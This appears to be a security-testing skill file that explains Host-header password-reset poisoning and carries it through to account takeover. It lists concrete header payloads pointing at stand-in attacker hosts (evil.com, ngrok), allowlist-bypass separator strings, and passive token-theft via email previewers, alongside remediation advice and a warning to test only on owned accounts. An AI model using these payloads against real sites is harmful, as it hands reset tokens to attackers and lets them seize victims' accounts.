---
name: host-header-password-poisoning
description: HTTP Host Header injection to poison password-reset (and other emailed) links -> full account takeover. When the app builds a reset link/URL using the HTTP Host (or X-Forwarded-Host / X-Forwarded-Proto / Forwarded) header, inject an attacker-controlled host into the request (or the victim's forgot-password request). The emailed reset link then points at the attacker's domain; if the victim (or a scripted click) opens it, the reset token reaches the attacker, who resets the victim's password -> account takeover. Also applies to email-verification, invite, or any email link built from a header. Triggers on: Host header injection, X-Forwarded-Host in password reset, password poisoning, reset token leak, email link host injection, account takeover via host header.
---

# Host Header Injection → Password Reset Token Poisoning → Account Takeover

When an app generates a URL for an email (password reset, email verification,
invite) using the **HTTP Host** header (or trustable-by-default proxies like
`X-Forwarded-Host`, `X-Forwarded-Proto`, `Forwarded`), an attacker who can control
that header controls where the emailed link points. Point it at a domain they own →
the reset token is delivered to them → they reset the victim's password.

## How it works

1. Normal: `POST /reset-password` with victim's email → app emails a link
   `https://site.com/action-token?key=<token>` (Host = site.com).
2. Attack: intercept the reset request, add the header
   `X-Forwarded-Host: <attacker>.ngrok.io` (or change `Host:` itself).
3. The app builds the email link with the attacker host:
   `https://<attacker>.ngrok.io/action-token?key=<token>`.
4. The victim's reset email now points at the attacker's server. When it's opened
   (victim clicks, or an auto-preview scanner), the `key`/token goes to the
   attacker's access logs.
5. Attacker uses the token to set a new password for the victim → **full account
   takeover**.

## Bypassing a host allowlist (suffix/prefix check) — the separator trick

Many apps won't accept an arbitrary host; they validate the **Host ends with
`login.<company>.com`** (a suffix check). Naive payloads then fail:

- Append attacker at end: `login.com.<attacker>.com` → passes the check but the link
  is `http(s)://login.com.<attacker>.com/...` — an **unresolvable host** (the
  `.com` of the attacker is removed + company domain appended), no pingback.
- Prepending attacker before the domain: `abc.<attacker>.login.company.com` → the
  attacker subdomain is "swallowed"; the host still ends in `login.company.com`, so
  the URL goes to the company, not you.

**The colon (`:`) bypass:** put the attacker host first and the allowed domain after
a `:` (which is treated as a port separator / handled loosely):
```
Host: abc.<attacker>.com:login.<company>.com
```
Both "contains the allowed string" (suffix check passes) AND the URL parser/builder
resolves the host as `abc.<attacker>.com` (the colon marks a port). The reset link
becomes:
```
https://abc.<attacker>.com/auth/realms/login-actions/action-token?key=<token>
```
→ a real, reachable attacker host carrying the token. Click/preview → HTTP pingback
→ token stolen → reset victim's password → **ATO**.

Other separator variants to try when the allowlist is a suffix/prefix/contains check:
- `attacker.com:allowed.com` (the colon above)
- `attacker.com@allowed.com` (`@` — userinfo)
- `attacker.com#allowed.com` / `attacker.com?allowed.com` (fragment/query)
- `attacker.com/allowed.com` (path)
- `attacker.com%2fallowed.com`, `%5c`, tab `%09`, newline `%0a`/`%0d`
- unicode/IDNA lookalikes (see `case-sensitivity-bypass`, `unicode-homoglyph-bypass`)

For each: the goal is a real attacker-controlled host that SURVIVES the validator
while still resolving to/through you (a reachable collab/ngrok host that yields the
token).

## Reusable checklist

1. **Which headers form the base URL?** Find where emailed links get their host:
   the raw `Host:` header, or proxy headers (`X-Forwarded-Host`, `X-Forwarded-Proto`,
   `Forwarded`, `X-Original-Host`, `X-Rewrite-URL`). Test each.
2. **Can you change the host?** Intercept a password-reset / email-verification /
   invite request and add `X-Forwarded-Host: evil.com` (or set `Host:`/`Forwarded:`).
   Does the emailed link now use evil.com?
   - Check both the full host and whether only the domain/port is reflected.
3. **Confirm the token leaks:** with a test account of your OWN, add the attacker
   host and receive the reset email; the link href should be your domain carrying
   the token (proof the token is in the poisoned URL).
4. **Reproduce for the victim:** enter the VICTIM's email + poisoned host → the
   victim's reset email contains `https://<attacker>/action-token?key=<token>`.
5. **If the host is allowlisted (suffix/prefix/contains), bypass it with separators:**
   try `attacker.com:allowed.com` (colon-as-port), then `@`, `#`, `?`, `/`, `%2f`,
   `%5c`, tab/newline, and unicode/IDNA lookalikes — the goal is a reachable
   attacker host that still passes the validator (see the separator section above).
5. If you can't receive the victim's email, still report it: any link preview /
   auto-fetch of the token-bearing URL delivers it to the attacker (or note the
   token is in a URL you control if the victim forwards/clicks).

Heighten impact with:
- **Token in URL** (vs. body) → leaks in Referer logs, proxies, browser history too.
- **Auto-fetching email clients / link previewers** → the reset link is fetched even
  before the victim clicks, delivering the token passively.

## Reporting
- Classify as **Improper Host Header Validation / password reset poisoning leading to
  account takeover** (CWE-287 / CWE-16 / CWE-74). Full ATO = Critical/High.
- Include: the original vs. `X-Forwarded-Host`-modified reset request, the emailed
  link showing the attacker host carrying `key=<token>`, and (for your own account)
  that the token is usable to change the password.
- Root cause: the app trusts the Host/proxy header to build the canonical URL
  without a server-side allowlist. Fix: derive the reset-link base from a fixed
  config/whitelisted origin, ignore or validate `X-Forwarded-*` (only trust it from
  known proxies), and/or bind the token to the intended origin.

## Gotchas
- If the app only strips/rejects non-whitelisted hosts, this won't fire — check the
  email link actually reflects your host (not a fallback to the real one).
- Test each forwarding header separately and in combination (`X-Forwarded-Host` +
  `X-Forwarded-Proto` for the scheme, `Forwarded: host=...`).
- Do NOT actually reset a real victim's password — demonstrate with a test account
  you own; for the writeup, stop at showing the poisoned link + that the token is
  reachable. Report responsibly.
